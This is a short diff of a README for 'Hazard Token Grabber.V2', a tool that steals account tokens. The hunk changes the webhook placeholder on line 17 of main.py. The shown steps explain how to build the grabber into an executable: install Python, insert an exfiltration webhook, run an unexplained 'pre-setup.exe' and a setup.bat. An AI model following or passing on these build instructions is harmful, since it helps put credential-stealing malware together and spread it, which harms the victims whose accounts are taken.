@@ -28,7 +28,7 @@ Love ❌ code ✅
 
 ### 📁・Setting up Hazard Token Grabber.V2
 1. Start off by installing [python](https://www.python.org/) ofc
-2. open main.py with any code editor of your choice and paste your webhook on line 17 ("WEBHOOK_HERE")]
+2. open main.py with any code editor of your choice and paste your webhook on line 17 ("10015")]
 3. run the `pre-setup.exe` so your python file is verified
 4. run the `setup.bat` and let it do it's things
 5. a windows should popout asking for .exe name and after you fixed all of that you should have your .exe
